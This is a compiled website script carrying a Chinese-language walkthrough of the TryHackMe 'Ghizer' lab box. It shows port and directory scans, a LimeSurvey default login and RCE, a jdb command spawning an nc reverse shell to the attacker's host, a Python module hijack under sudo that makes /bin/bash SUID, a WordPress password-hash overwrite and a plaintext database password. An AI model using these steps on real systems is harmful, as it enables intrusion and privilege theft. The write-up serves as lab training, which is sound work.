"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[6178],{65708:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>i,default:()=>h,frontMatter:()=>a,metadata:()=>o,toc:()=>l});var r=t(74848),s=t(28453);const a={sidebar_position:133,tags:["Easy","Linux","\u547d\u4ee4\u6ce8\u5165","\u6587\u4ef6\u4e0a\u4f20","SUDO"],title:"Ghizer",description:"Ghizer",sidebar_label:"Ghizer",slug:"/tryhackme/133"},i="Ghizer",o={id:"box/TryHackMe/133",title:"Ghizer",description:"Ghizer",source:"@site/docs/box/TryHackMe/133.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/133",permalink:"/docs/tryhackme/133",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u547d\u4ee4\u6ce8\u5165",permalink:"/docs/tags/\u547d\u4ee4\u6ce8\u5165"},{label:"\u6587\u4ef6\u4e0a\u4f20",permalink:"/docs/tags/\u6587\u4ef6\u4e0a\u4f20"},{label:"SUDO",permalink:"/docs/tags/sudo"}],version:"current",sidebarPosition:133,frontMatter:{sidebar_position:133,tags:["Easy","Linux","\u547d\u4ee4\u6ce8\u5165","\u6587\u4ef6\u4e0a\u4f20","SUDO"],title:"Ghizer",description:"Ghizer",sidebar_label:"Ghizer",slug:"/tryhackme/133"},sidebar:"boxSidebar",previous:{title:"Metamorphosis",permalink:"/docs/tryhackme/132"},next:{title:"Lunizz CTF",permalink:"/docs/tryhackme/134"}},c={},l=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"www-data",id:"www-data",level:3},{value:"www-data \u2014&gt; veronica",id:"www-data--veronica",level:3},{value:"veronica \u2014&gt; root",id:"veronica--root",level:3},{value:"\u6269\u5c55",id:"\u6269\u5c55",level:2},{value:"443",id:"443",level:3}];function u(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,s.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.h1,{id:"ghizer",children:"Ghizer"}),"\n",(0,r.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-139-140:~/ghizerctf# nmap -sTCV -p- --min-rate 1000 10.10.93.114\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-10-03 07:51 BST\nNmap scan report for ip-10-10-93-114.eu-west-1.compute.internal (10.10.93.114)\nHost is up (0.00036s latency).\nNot shown: 65529 closed ports\nPORT      STATE SERVICE     VERSION\n21/tcp    open  ftp?\n| fingerprint-strings: \n|   DNSStatusRequest, DNSVersionBindReq, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, X11Probe: \n|     220 Welcome to Anonymous FTP server (vsFTPd 3.0.3)\n|     Please login with USER and PASS.\n|   Kerberos, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq: \n|_    220 Welcome to Anonymous FTP server (vsFTPd 3.0.3)\n80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))\n|_http-generator: LimeSurvey http://www.limesurvey.org\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title:         LimeSurvey    \n443/tcp   open  ssl/http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-generator: WordPress 5.4.2\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Ghizer &#8211; Just another WordPress site\n| ssl-cert: Subject: commonName=ubuntu\n| Not valid before: 2020-07-23T17:27:31\n|_Not valid after:  2030-07-21T17:27:31\n|_ssl-date: TLS randomness does not represent time\n18002/tcp open  java-rmi    Java RMI Registry\n| rmi-dumpregistry: \n|   jmxrmi\n|     javax.management.remote.rmi.RMIServerImpl_Stub\n|     @127.0.1.1:38429\n|     extends\n|       java.rmi.server.RemoteStub\n|       extends\n|_        java.rmi.server.RemoteObject\n38429/tcp open  rmiregistry Java RMI\n41119/tcp open  tcpwrapped\n"})}),"\n",(0,r.jsx)(n.h2,{id:"80",children:"80"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-139-140:~/ghizerctf# gobuster dir -u http://10.10.93.114/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.93.114/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     php,txt,html\n[+] Timeout:        10s\n===============================================================\n2023/10/03 07:54:50 Starting gobuster\n===============================================================\n/docs (Status: 301)\n/themes (Status: 301)\n/index.php (Status: 200)\n/admin (Status: 301)\n/assets (Status: 301)\n/upload (Status: 301)\n/tests (Status: 301)\n/plugins (Status: 301)\n/application (Status: 301)\n/tmp (Status: 301)\n/framework (Status: 301)\n/locale (Status: 301)\n/installer (Status: 301)\n/third_party (Status: 301)\n/server-status (Status: 403)\n===============================================================\n2023/10/03 07:56:54 Finished\n===============================================================\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u8bbf\u95ee\u540e\u6211\u53d1\u73b0\u5176\u662f\u4e00\u4e2a LimeSurvey \u7a0b\u5e8f, \u7b80\u5355\u641c\u7d22\u6211\u53d1\u73b0\u4e86\u5176\u9ed8\u8ba4\u767b\u9646\u5bc6\u7801 admin",":password","  \u53d1\u73b0\u53ef\u4ee5\u767b\u9646"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-153159.png",alt:"image-20240709153157989"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5728\u5176\u4e0b\u6cc4\u9732\u4e86\u5176\u7248\u672c\u6240\u5728, \u6240\u4ee5\u76f4\u63a5\u5bfb\u627e\u6f0f\u6d1e\u53d1\u73b0\u4e00\u4e2a RCE \u6f0f\u6d1e ",(0,r.jsx)(n.a,{href:"https://www.exploit-db.com/exploits/46634",children:"LimeSurvey < 3.16 - Remote Code Execution"})]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-153210.png",alt:"image-20240709153208827"})}),"\n",(0,r.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,r.jsx)(n.h3,{id:"www-data",children:"www-data"}),"\n",(0,r.jsx)(n.p,{children:"\u5229\u7528\u4e0a\u9762\u5f97\u5230\u7684 Shell \u8f6c\u6362\u4e3a reverse"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-153223.png",alt:"image-20240709153221682"})}),"\n",(0,r.jsx)(n.h3,{id:"www-data--veronica",children:"www-data \u2014> veronica"}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u7528\u6237 veronica \u7684\u5bb6\u76ee\u5f55\u6211\u53d1\u73b0\u4e86\u4e00\u4e2a\u7279\u6b8a\u7684\u7a0b\u5e8f"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-153234.png",alt:"image-20240709153233409"})}),"\n",(0,r.jsx)(n.p,{children:"\u540c\u65f6\u67e5\u770b\u8fdb\u7a0b\u6211\u53d1\u73b0\u4e86\u8fd9\u4e2a\u7a0b\u5e8f\u5176\u5b9e\u4e00\u76f4\u5728\u8fd0\u884c"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-153240.png",alt:"image-20240709153239172"})}),"\n",(0,r.jsxs)(n.p,{children:["\u63a5\u7740\u6211\u7ecf\u8fc7\u641c\u7d22\u53d1\u73b0\u5176\u5b58\u5728\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e ",(0,r.jsx)(n.a,{href:"https://thewhiteh4t.github.io/2019/03/16/Ghidra-v9.0-Remote-Code-Execution-PoC-Windows-10-1809.html",children:"Ghidra v9.0 Remote Code Execution | PoC | Windows 10 1809"})]}),"\n",(0,r.jsx)(n.p,{children:"\u63a5\u7740\u6211\u4fbf\u5229\u7528\u6b64\u6765\u8fdb\u884c\u653b\u51fb"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'(remote) www-data@ubuntu:/home/veronica$ jdb -attach 127.0.0.1:18001\nSet uncaught java.lang.Throwable\nSet deferred uncaught java.lang.Throwable\nInitializing jdb ...\n> classes\n....\n> stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()\nSet breakpoint org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()\n> \nBreakpoint hit: "thread=Log4j2-TF-4-Scheduled-1", org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run(), line=96 bci=0\nLog4j2-TF-4-Scheduled-1[1] print new java.lang.Runtime().exec("nc 10.10.139.140 4445 -e /bin/bash")\n new java.lang.Runtime().exec("nc 10.10.139.140 4445 -e /bin/bash") = "Process[pid=20383, exitValue="not exited"]"\nLog4j2-TF-4-Scheduled-1[1]\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-153249.png",alt:"image-20240709153248088"})}),"\n",(0,r.jsx)(n.h3,{id:"veronica--root",children:"veronica \u2014> root"}),"\n",(0,r.jsx)(n.p,{children:"\u6211\u53d1\u73b0 veronica \u7528\u6237\u5b58\u5728 SUDO \u7279\u6743\u53ef\u4ee5\u6267\u884c\u4e00\u4e2a Python \u7a0b\u5e8f, \u7ecf\u8fc7\u89c2\u5bdf\u6211\u53d1\u73b0\u53ef\u4ee5\u5229\u7528\u5176\u8fdb\u884c Python \u7684 PATH \u63d0\u6743"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"(remote) veronica@ubuntu:/home/veronica$ sudo -l\nMatching Defaults entries for veronica on ubuntu:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser veronica may run the following commands on ubuntu:\n    (ALL : ALL) ALL\n    (root : root) NOPASSWD: /usr/bin/python3.5 /home/veronica/base.py\n(remote) veronica@ubuntu:/home/veronica$ cat base.py \nimport base64\n\nhijackme = base64.b64encode(b'tryhackme is the best')\nprint(hijackme)\n\n(remote) veronica@ubuntu:/home/veronica$ ls -al base.py \n-rw-r--r-- 1 root root 86 Jul 23  2020 base.py\n(remote) veronica@ubuntu:/home/veronica$  python3 -c 'import sys; print (sys.path)'\n['', '/usr/lib/python35.zip', '/usr/lib/python3.5', '/usr/lib/python3.5/plat-x86_64-linux-gnu', '/usr/lib/python3.5/lib-dynload', '/usr/local/lib/python3.5/dist-packages', '/usr/lib/python3/dist-packages']\n(remote) veronica@ubuntu:/home/veronica$ cat << EOF > base64.py\n> import os\n> os.system(\"chmod u+s /bin/bash\")\n> EOF\n(remote) veronica@ubuntu:/home/veronica$ sudo /usr/bin/python3.5 /home/veronica/base.py\n......\nAttributeError: module 'base64' has no attribute 'b64encode'\n(remote) veronica@ubuntu:/home/veronica$ ls -al /bin/bash\n-rwsr-xr-x 1 root root 1037528 Jul 12  2019 /bin/bash\n"})}),"\n",(0,r.jsx)(n.h2,{id:"\u6269\u5c55",children:"\u6269\u5c55"}),"\n",(0,r.jsx)(n.h3,{id:"443",children:"443"}),"\n",(0,r.jsx)(n.p,{children:"\u8bbf\u95ee 443 \u7aef\u53e3\u6211\u53d1\u73b0\u5176\u662f\u4e00\u4e2a Wordpress \u7ad9\u70b9, \u4f46\u662f\u5728\u6211\u8bbf\u95ee wp-admin \u7f51\u9875\u663e\u793a\u4f7f\u7528\u4e00\u4e2a WPS Hide Login \u63d2\u4ef6"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-153303.png",alt:"image-20240709153302251"})}),"\n",(0,r.jsx)(n.p,{children:"\u63a5\u7740\u6211\u8fdb\u884c\u4e86\u679a\u4e3e, \u53d1\u73b0\u4e00\u4e2a devtools , \u5229\u7528\u6b64\u5c31\u53ef\u4ee5\u8bbf\u95ee\u6211\u4eec\u7684\u767b\u9646\u9875\u9762"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-153310.png",alt:"image-20240709153308895"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5229\u7528\u6211\u4eec\u4e4b\u524d\u5728 80 \u7aef\u53e3\u83b7\u53d6\u7684 Shell \u6211\u67e5\u770b\u4e86\u914d\u7f6e\u6587\u4ef6, \u83b7\u53d6\u5230\u4e86\u6570\u636e\u5e93\u7684\u8fde\u63a5\u56e0\u6b64\u6211\u9009\u62e9\u5728\u6b64\u4fee\u6539 Wordpress \u7684\u7528\u6237\u5bc6\u7801 ",(0,r.jsx)(n.a,{href:"https://codebeautify.org/wordpress-password-hash-generator",children:"Wordpress Password Hash Generator to reset your Wordpress Password."})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'mysql> SELECT * FROM wp_users;\n+----+------------+------------------------------------+---------------+----------------+------------------------+---------------------+---------------------+-------------+--------------+\n| ID | user_login | user_pass                          | user_nicename | user_email     | user_url               | user_registered     | user_activation_key | user_status | display_name |\n+----+------------+------------------------------------+---------------+----------------+------------------------+---------------------+---------------------+-------------+--------------+\n|  1 | Anny       | $P$BJImLXNua3oNCoX7gSXEvWkHxuz.K9. | anny          | ghizer@thm.com | https://192.168.85.128 | 2020-07-23 22:46:47 |                     |           0 | Anny         |\n+----+------------+------------------------------------+---------------+----------------+------------------------+---------------------+---------------------+-------------+--------------+\n1 row in set (0.01 sec)\n\nmysql> UPDATE wp_users SET User_pass="$P$BjBHlMMkLdc7t58EFTLztqvn1b1IrO." WHERE user_login="Anny"\n    -> ;\nQuery OK, 1 row affected (0.00 sec)\nRows matched: 1  Changed: 1  Warnings: 0\n\nmysql> SELECT * FROM wp_users;\n+----+------------+------------------------------------+---------------+----------------+------------------------+---------------------+---------------------+-------------+--------------+\n| ID | user_login | user_pass                          | user_nicename | user_email     | user_url               | user_registered     | user_activation_key | user_status | display_name |\n+----+------------+------------------------------------+---------------+----------------+------------------------+---------------------+---------------------+-------------+--------------+\n|  1 | Anny       | $P$BjBHlMMkLdc7t58EFTLztqvn1b1IrO. | anny          | ghizer@thm.com | https://192.168.85.128 | 2020-07-23 22:46:47 |                     |           0 | Anny         |\n+----+------------+------------------------------------+---------------+----------------+------------------------+---------------------+---------------------+-------------+--------------+\n1 row in set (0.00 sec)\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u6b64\u6211\u4eec\u767b\u9646\u4e4b\u540e\u53ef\u4ee5\u901a\u8fc7\u4e0a\u4f20\u63d2\u4ef6\u6765\u83b7\u53d6\u4e00\u4e2a Shell, \u4f46\u662f\u83b7\u53d6\u7684\u8fd8\u662f www-data \u7528\u6237\u7684 Shell"}),"\n",(0,r.jsx)(n.p,{children:"\u5176\u5b9e\u6211\u4eec\u53ef\u4ee5\u5728limesurvey \u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\u53d1\u73b0\u7528\u6237 Anny \u7684\u660e\u6587\u5bc6\u7801"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"(remote) root@ubuntu:/var/www/html/limesurvey/application/config# cat config.php \n<?php if (!defined('BASEPATH')) exit('No direct script access allowed');\n.....\nreturn array(\n\t'components' => array(\n\t\t'db' => array(\n\t\t\t'connectionString' => 'mysql:host=localhost;port=3306;dbname=limedb;',\n\t\t\t'emulatePrepare' => true,\n\t\t\t'username' => 'Anny',\n\t\t\t'password' => 'P4$W0RD!!#S3CUr3!',\n\t\t\t'charset' => 'utf8mb4',\n\t\t\t'tablePrefix' => 'lime_',\n"})})]})}function h(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(u,{...e})}):u(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>i,x:()=>o});var r=t(96540);const s={},a=r.createContext(s);function i(e){const n=r.useContext(a);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:i(e.components),r.createElement(a.Provider,{value:n},e.children)}}}]);